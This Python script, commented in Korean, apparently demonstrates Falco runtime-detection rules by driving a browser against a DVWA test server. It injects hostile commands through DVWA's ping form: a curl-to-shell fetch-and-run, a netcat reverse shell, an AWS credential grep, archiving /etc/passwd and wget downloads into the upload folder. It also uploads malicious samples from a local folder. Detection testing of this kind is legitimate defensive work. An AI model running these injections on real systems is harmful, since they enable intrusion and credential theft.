#!/usr/bin/env python3
"""
Falco 규칙 유닛 테스트 자동화 데모 레코더
설명: Selenium을 사용하여 DVWA 웹사이트에서 Falco 규칙을 테스트하고
      전체 과정을 화면 녹화합니다.
작성일: 2025-12-31.
"""
import sys
import time
import threading
import os
import random
from abc import ABC, abstractmethod
from dataclasses import dataclass, field
from datetime import datetime
from typing import List, Optional

# 외부 라이브러리 체크 및 임포트
try:
    from selenium import webdriver
    from selenium.webdriver.common.by import By
    from selenium.webdriver.chrome.options import Options
    from selenium.webdriver.support.ui import WebDriverWait
    from selenium.webdriver.support import expected_conditions as EC
    from PIL import ImageGrab
    import cv2
    import numpy as np
    RECORDING_AVAILABLE = True
except ImportError as e:
    print(f"⚠️ 필수 라이브러리가 없습니다: {e}")
    RECORDING_AVAILABLE = False

# ============================================================================
# 1. Configuration Layer (설정)
# ============================================================================

@dataclass
class AppConfig:
    """애플리케이션 설정 및 상태 관리"""
    # DVWA 기본 설정
    dvwa_url: str = "http://3.219.28.140:31100"
    username: str = "admin"
    password: str = "password"
    security_level: str = "low"
    
    # 브라우저 설정
    headless: bool = False  # 화면을 띄워서 접속 과정을 확인
    window_width: int = 1920
    window_height: int = 1080
    
    # 녹화 설정
    record_video: bool = True
    video_fps: float = 2.0
    output_filename: str = field(default_factory=lambda: f"falco_demo_{datetime.now().strftime('%Y%m%d_%H%M%S')}.mp4")
    
    # 테스트 설정
    delay_between_tests: int = 2
    sample_target_count: int = 10   # 랜덤 샘플링 개수

# ============================================================================
# 2. Service Layer (인프라 및 기능 구현) - SRP 준수

# ============================================================================

class SampleFileService:
    """악성 샘플 파일 스캔 및 선택 서비스"""
    def __init__(self, sample_dir_name: str = "sample"):
        self.base_dir = os.path.dirname(os.path.abspath(__file__))
        self.sample_dir = os.path.join(self.base_dir, sample_dir_name)

    def get_random_samples(self, limit: int) -> List[str]:
        """sample 폴더에서 파일을 무작위로 'limit' 개수만큼 선택하여 반환"""
        if not os.path.exists(self.sample_dir):
            print(f"⚠️ 샘플 디렉터리를 찾을 수 없습니다: {self.sample_dir}")
            return []

        # 숨김 파일 제외하고 파일 목록 스캔
        all_files = [f for f in os.listdir(self.sample_dir) 
                     if os.path.isfile(os.path.join(self.sample_dir, f)) and not f.startswith('.')]
        
        if not all_files:
            print("⚠️ 샘플 폴더가 비어 있습니다.")
            return []

        if len(all_files) > limit:
            selected = sorted(random.sample(all_files, limit))
            print(f"🎲 파일이 너무 많아 {len(all_files)}개 중 {limit}개를 무작위로 선택했습니다.")
        else:
            selected = sorted(all_files)
            print(f"📦 전체 파일 {len(all_files)}개를 모두 테스트합니다.")
            
        return selected

class RecorderService:
    """화면 녹화 서비스 (OpenCV)"""
    def __init__(self, filename: str, fps: float):
        self.filename = filename
        self.fps = fps
        self.recording = False
        self.thread = None
        self.out = None

    def start(self):
        if not RECORDING_AVAILABLE:
            return
        self.recording = True
        self.thread = threading.Thread(target=self._record_loop)
        self.thread.start()
        print(f"🎥 화면 녹화 시작: {self.filename} (FPS: {self.fps})")

    def _record_loop(self):
        screen = ImageGrab.grab()
        width, height = screen.size
        # Mac 호환성 코덱 'avc1'
        fourcc = cv2.VideoWriter_fourcc(*'avc1')
        self.out = cv2.VideoWriter(self.filename, fourcc, self.fps, (width, height))
        
        while self.recording:
            img = ImageGrab.grab()
            frame = np.array(img)
            frame = cv2.cvtColor(frame, cv2.COLOR_RGB2BGR)
            self.out.write(frame)
            time.sleep(1.0 / self.fps)

    def stop(self):
        if not self.recording:
            return
        self.recording = False
        if self.thread:
            self.thread.join()
        if self.out:
            self.out.release()
        print(f"✅ 녹화 완료: {self.filename}")

class BrowserService:
    """브라우저 제어 서비스 (Selenium)"""
    def __init__(self, config: AppConfig):
        self.config = config
        self.driver = None
        self.wait = None

    def setup(self):
        print("🌐 브라우저 초기화 중...")
        options = Options()
        if self.config.headless:
            options.add_argument('--headless')
            
        # 🌙 다크 모드 강제 적용
        options.add_argument("--force-dark-mode")
        options.add_argument("--enable-features=WebUIDarkMode")
        
        options.add_argument(f'--window-size={self.config.window_width},{self.config.window_height}')
        options.add_argument('--disable-gpu')
        options.add_argument('--no-sandbox')
        options.add_argument('--disable-dev-shm-usage')
        
        self.driver = webdriver.Chrome(options=options)
        self.wait = WebDriverWait(self.driver, 10)
        print("✅ 브라우저 준비 완료")

    def navigate_to_login_page(self):
        """로그인 페이지로 이동만 수행"""
        print(f"🌐 페이지 접속: {self.config.dvwa_url}")
        try:
            self.driver.get(f"{self.config.dvwa_url}/login.php")
            # 페이지 로딩 대기
            time.sleep(1)
        except Exception as e:
            print(f"❌ 접속 실패: {e}")

    def submit_login_credentials(self) -> bool:
        """ID/PW 입력 및 로그인 제출"""
        print(f"🔐 자격 증명 제출: {self.config.username}")
        try:
            user_field = self.wait.until(EC.presence_of_element_located((By.NAME, "username")))
            user_field.clear()
            user_field.send_keys(self.config.username)
            pass_field = self.driver.find_element(By.NAME, "password")
            pass_field.clear()
            pass_field.send_keys(self.config.password)
            self.driver.find_element(By.NAME, "Login").click()
            time.sleep(1)
            
            if "Welcome" in self.driver.page_source or "logout.php" in self.driver.current_url:
                print("✅ 로그인 성공")
                return True
            return False
        except Exception as e:
            print(f"❌ 로그인 실패: {e}")
            return False

    def set_security_level(self) -> bool:
        try:
            self.driver.get(f"{self.config.dvwa_url}/security.php")
            time.sleep(1)
            select = self.wait.until(EC.presence_of_element_located((By.NAME, "security")))
            
            from selenium.webdriver.support.ui import Select
            sel = Select(select)
            sel.select_by_value(self.config.security_level)
            
            self.driver.find_element(By.NAME, "seclev_submit").click()
            time.sleep(1)
            print(f"🛡️ 보안 레벨 설정 완료: {self.config.security_level}")
            return True
        except Exception as e:
            print(f"⚠️ 보안 레벨 설정 실패: {e}")
            return False

    def take_screenshot(self, name: str):
        if not os.path.exists("screenshots"):
            os.makedirs("screenshots")
        filename = f"screenshots/{name}.png"
        self.driver.save_screenshot(filename)
        print(f"📸 스크린샷: {filename}")

    def cleanup(self):
        if self.driver:
            self.driver.quit()
            print("🔚 브라우저 종료")

# ============================================================================
# 3. Domain Layer (시나리오 추상화) - OCP/DIP 준수
# ============================================================================

class TestScenario(ABC):
    """모든 테스트 시나리오의 기본 인터페이스"""
    def __init__(self, name: str, description: str):
        self.name = name
        self.description = description

    @abstractmethod
    def execute(self, browser: BrowserService) -> bool:
        pass

# ============================================================================
# 4. Use Case Implementations (구체적 시나리오 구현)
# ============================================================================

class CommandInjectionScenario(TestScenario):
    """Command Injection 공격 시나리오"""
    def __init__(self, name: str, description: str, payload: str, cmd_desc: str):
        super().__init__(name, description)
        self.payload = payload
        self.cmd_desc = cmd_desc

    def execute(self, browser: BrowserService) -> bool:
        print(f"\n[{self.description}] 실행 중...")
        print(f"   📝 Payload: {self.cmd_desc}")
        try:
            browser.driver.get(f"{browser.config.dvwa_url}/vulnerabilities/exec/")
            time.sleep(1)
            browser.take_screenshot(f"{self.name}_before")
            
            input_field = browser.wait.until(EC.presence_of_element_located((By.NAME, "ip")))
            input_field.clear()
            
            # 보안 레벨에 따른 페이로드 조립
            separator = ";" if browser.config.security_level == "low" else "&&"
            if browser.config.security_level not in ["low", "medium"]: separator = "|"
            full_payload = f"127.0.0.1{separator} {self.payload}"
            
            input_field.send_keys(full_payload)
            browser.driver.find_element(By.NAME, "Submit").click()
            
            time.sleep(2)
            browser.take_screenshot(f"{self.name}_after")
            print("   ✅ 공격 완료")
            return True
        except Exception as e:
            print(f"   ❌ 공격 실패: {e}")
            return False

class FileUploadScenario(TestScenario):
    """File Upload 공격 시나리오 (Sample 폴더 연동)"""
    def __init__(self, name: str, description: str, filename: str):
        super().__init__(name, description)
        self.filename = filename

    def execute(self, browser: BrowserService) -> bool:
        print(f"\n[{self.description}] 실행 중...")
        try:
            browser.driver.get(f"{browser.config.dvwa_url}/vulnerabilities/upload/")
            time.sleep(1)
            
            # 현재 파일 기준 sample 경로 계산
            current_dir = os.path.dirname(os.path.abspath(__file__))
            sample_path = os.path.join(current_dir, "sample", self.filename)
            
            if not os.path.exists(sample_path):
                print(f"   ❌ 오류: 파일 없음 ({self.filename})")
                return False
                
            browser.driver.find_element(By.NAME, "uploaded").send_keys(sample_path)
            time.sleep(1)
            browser.driver.find_element(By.NAME, "Upload").click()
            
            time.sleep(2)
            browser.take_screenshot(f"{self.name}_result")
            print(f"   ✅ 업로드 완료: {self.filename}")
            return True
        except Exception as e:
            print(f"   ❌ 업로드 실패: {e}")
            return False

# ============================================================================
# 5. Application Orchestration (실행 제어)
# ============================================================================

class TestRunner:
    """테스트 실행 및 관리자"""
    def __init__(self, browser_service: BrowserService, recorder_service: RecorderService):
        self.browser = browser_service
        self.recorder = recorder_service
        self.scenarios: List[TestScenario] = []

    def add_scenario(self, scenario: TestScenario):
        self.scenarios.append(scenario)

    def run(self):
        print("\n🚀 테스트 시나리오 실행 시작...")
        
        # 1. 브라우저 준비 및 페이지 접속
        self.browser.setup()
        self.browser.navigate_to_login_page()
        
        # 🌟 [Flow Control] 사용자 화면 배치 시간 (5초)
        print("\n" + "="*60)
        print("🖥️  [화면 배치 시간] 5초간 대기합니다.")
        print("   >> 브라우저 크기를 줄이고, 우측에 디스크도 알림창을 배치하세요!")
        print("="*60)
        
        for i in range(5, 0, -1):
            print(f"⏳ 테스트 시작까지 {i}초...", end="\r")
            time.sleep(1)
        print("\n🚀 로그인을 진행합니다...\n")

        # 2. 로그인 및 보안 설정
        if not self.browser.submit_login_credentials():
            print("❌ 로그인 실패로 중단합니다.")
            self.cleanup()
            return

        self.browser.set_security_level()
        
        success_count = 0
        for idx, scenario in enumerate(self.scenarios, 1):
            print(f"\n--- [{idx}/{len(self.scenarios)}] 실행 중: {scenario.description} ---")
            if scenario.execute(self.browser):
                success_count += 1
            time.sleep(self.browser.config.delay_between_tests)
            
        print("\n" + "="*60)
        print(f"📊 테스트 결과: {success_count} / {len(self.scenarios)} 성공")
        print("="*60)
        
        # self.cleanup()  <-- 브라우저 유지를 위해 주석 처리

    def cleanup(self):
        self.browser.cleanup()

# ============================================================================
# 6. Main Entry Point
# ============================================================================

def main():
    print("╔════════════════════════════════════════════════════════════╗")
    print("║     Falco Security Test Recorder (Refactored v2.2)         ║")
    print("║     Principles: Clean Architecture & SOLID                 ║")
    print("╚════════════════════════════════════════════════════════════╝\n")
    
    # 1. 설정 초기화
    config = AppConfig()
    
    # 2. 녹화 서비스 시작
    recorder = None
    if config.record_video and RECORDING_AVAILABLE:
        recorder = RecorderService(config.output_filename, config.video_fps)
        recorder.start()
        time.sleep(1) # 녹화 안정화
    browser_svc = None  # 변수 초기화
    try:
        # 3. 사용자 입력 (UI)
        print("\n🛠️  TEST CONFIGURATION (Default values in brackets)")
        url_in = input(f"🌐 DVWA URL [{config.dvwa_url}]: ").strip()
        if url_in: config.dvwa_url = url_in.replace("'", "").replace('"', "")
        
        user_in = input(f"👤 Username [{config.username}]: ").strip()
        if user_in: config.username = user_in
        
        pass_in = input(f"🔑 Password [{config.password}]: ").strip()
        if pass_in: config.password = pass_in
        
        sec_level_in = input(f"🛡️ Security Level (low/medium/high/impossible) [{config.security_level}]: ").strip().lower()
        if sec_level_in in ["low", "medium", "high", "impossible"]:
            config.security_level = sec_level_in
        elif sec_level_in:
            print(f"⚠️ 유효하지 않은 보안 레벨입니다. 기본값 '{config.security_level}'을 사용합니다.")

        print(f"\n🚀 설정 완료. 즉시 시작합니다!")
        
        # 4. 서비스 인스턴스화 (DI)
        browser_svc = BrowserService(config)
        sample_svc = SampleFileService("sample")
        runner = TestRunner(browser_svc, recorder)
        
        # 5. 시나리오 조립
        
        # [Section 1] DVWA Artifacts
        print("\n" + "="*70)
        print("📦 SECTION 1: DVWA ARTIFACT RULES (업로드 경로 집중 공격)")
        print("   Target Path: /var/www/html/hackable/uploads/")
        print("="*70)
        runner.add_scenario(CommandInjectionScenario(
            "test04_artifact_exec", 
            "업로드 경로 파일 실행 시도", 
            "cat /var/www/html/hackable/uploads/shell.php",
            "Exec from Upload Dir"
        ))
        runner.add_scenario(CommandInjectionScenario(
            "test05_artifact_fetch_to_upload",
            "외부 도구를 이용해 업로드 경로에 파일 다운로드",
            "wget -O /var/www/html/hackable/uploads/hack.sh http://example.com",
            "Download Tool Writes To Upload Dir"
        ))
        runner.add_scenario(CommandInjectionScenario(
            "test06_artifact_move",
            "업로드 경로 내 파일 이동/이름 변경",
            "mv /var/www/html/hackable/uploads/shell.php /var/www/html/hackable/uploads/hidden_shell.php",
            "Upload Dir File Move"
        ))
        runner.add_scenario(CommandInjectionScenario(
            "test07_artifact_webshell",
            "웹 서버에서 쉘 실행 (Shell Spawning)",
            "whoami",
            "Webserver Spawns Shell"
        ))
        
        # --- SECTION 2: RUNTIME EXEC ---
        print("\n" + "="*70)
        print("📦 SECTION 2: PRJ EXEC RULES (일반 런타임 공격)")
        print("="*70)
        runner.add_scenario(CommandInjectionScenario(
            "test08_prj_recon", 
            "시스템 정찰 (Reconnaissance)", 
            "uname -a; id; ps aux",
            "System Recon"
        ))
        runner.add_scenario(CommandInjectionScenario(
            "test09_prj_cred", 
            "클라우드 자격 증명 검색", 
            "grep -r 'AWS_ACCESS_KEY_ID' /var/www/html/",
            "Credential Search"
        ))
        runner.add_scenario(CommandInjectionScenario(
            "test10_prj_fetchrun",
            "메모리상 스크립트 다운로드 및 즉시 실행 (Fetch & Run)",
            "curl http://example.com/malware.sh | sh",
            "Fetch And Run"
        ))
        runner.add_scenario(CommandInjectionScenario(
            "test11_prj_tmp",
            "임시 디렉토리(/tmp)에서 바이너리 실행",
            "cp /bin/ls /tmp/malicious_ls && /tmp/malicious_ls",
            "Exec From Tmp Paths"
        ))
        runner.add_scenario(CommandInjectionScenario(
            "test12_prj_revsh", 
            "리버스 쉘 연결 시도", 
            "nc -e /bin/sh 127.0.0.1 4444",
            "Reverse Shell Tooling"
        ))
        runner.add_scenario(CommandInjectionScenario(
            "test13_prj_archive",
            "데이터 압축 및 스테이징 (Archive)",
            "tar -czf /tmp/data.tar.gz /etc/passwd",
            "Archive/Staging"
        ))
        
        # --- SECTION 3: MALWARE UPLOAD ---
        print("\n" + "="*70)
        print("📦 SECTION 3: MALWARE UPLOAD (Yara/Cuckoo Analysis)")
        print("   Upload Malicious Files from 'sample' folder")
        print("="*70)
        
        # sample 폴더의 모든 파일 자동 스캔 및 등록
        import random  # Random sampling을 위해 추가
        current_dir = os.path.dirname(os.path.abspath(__file__))
        sample_dir = os.path.join(current_dir, "sample")
        
        if os.path.exists(sample_dir):
            # 파일명 정렬
            all_sample_files = sorted([f for f in os.listdir(sample_dir) if os.path.isfile(os.path.join(sample_dir, f))])
            
            # 숨김 파일(.DS_Store 등) 제외
            valid_files = [f for f in all_sample_files if not f.startswith('.')]
            
            if not valid_files:
                print("⚠️ sample 폴더가 비어있습니다.")
            else:
                # 🎲 랜덤 샘플링: 최대 10개만 선택
                target_count = 10
                if len(valid_files) > target_count:
                    selected_files = sorted(random.sample(valid_files, target_count))
                    print(f"🎲 파일이 너무 많아 {len(valid_files)}개 중 {target_count}개를 무작위로 선택했습니다.")
                else:
                    selected_files = valid_files
                    print(f"📦 전체 파일 {len(valid_files)}개를 테스트합니다.")
                
                print(f"📋 선택된 파일 목록: {selected_files}")

                for filename in selected_files:
                    runner.add_scenario(FileUploadScenario(
                        f"test_upload_{filename}", 
                        f"악성 샘플 업로드: {filename}", 
                        filename
                    ))
                    print(f"➕ 테스트 시나리오 추가됨: {filename}")
        else:
            print(f"⚠️ sample 폴더를 찾을 수 없습니다: {sample_dir}")

        
        # 6. 테스트 실행
        runner.run()
        
    except KeyboardInterrupt:
        print("\n⚠️  중단됨")
    except Exception as e:
        print(f"\n❌ 오류: {e}")
        import traceback
        traceback.print_exc()
    finally:
        print("\n⏸️  종료 중...")
        time.sleep(3)
        if recorder: recorder.stop()
        # if browser_svc: browser_svc.cleanup()
        print("🌐 브라우저는 닫지 않고 유지합니다.")


if __name__ == "__main__":
    main()
